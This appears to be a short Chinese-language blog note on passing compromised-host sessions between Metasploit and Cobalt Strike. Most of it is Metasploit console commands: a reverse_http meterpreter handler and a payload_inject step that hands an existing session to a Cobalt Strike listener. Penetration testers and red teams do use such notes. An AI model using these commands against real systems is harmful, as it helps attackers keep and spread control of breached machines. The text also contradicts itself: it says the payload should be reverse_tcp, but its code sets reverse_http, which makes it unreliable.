---
title: msf和cs联动
tags:
  - msf
  - cs
abbrlink: 32255
date: 2022-05-12 20:29:34
---

## cs传shell给msf

1.msf

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.110.130     
set lport 4444
```

2.cs创建监听器，名字为msf

选择Foreign http

3.cs执行监听器 spawn msf

## msf传shell给cs

1. cs创建监听器

​	选择的是http方式连接

2. msf派生shell

​	先把会话放到后台，设置如下。因为cs上设置的为http连接，所以我们下边payload也要对应的设置为reverse_tcp

~~~~
#派生一个新的shell给cs，那么msf里面用到的exploit是
use exploit/windows/local/payload_inject 
set payload windows/meterpreter/reverse_http
#禁止产生一个新的handler
set disablepayloadhandler true
#设置ip端口为cs监听的
set LHOST IP
set LPORT 端口
set session 3
run
~~~~

